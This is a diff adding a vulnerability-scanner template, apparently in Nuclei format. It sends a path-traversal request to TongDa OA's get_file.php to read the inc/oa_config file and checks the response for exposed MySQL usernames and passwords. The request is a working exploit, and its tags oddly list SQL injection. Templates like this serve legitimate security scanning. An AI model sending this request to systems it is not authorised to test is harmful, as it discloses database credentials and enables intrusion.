@@ -1,0 +1,21 @@
+id: poc-yaml-tong-da-oa-get-file-php-anyfile-read
+info:
+  name: TongDa OA get_file.php Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli, file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "MYSQL_USER="
+          - "MYSQL_PASS="
+          - "<?"
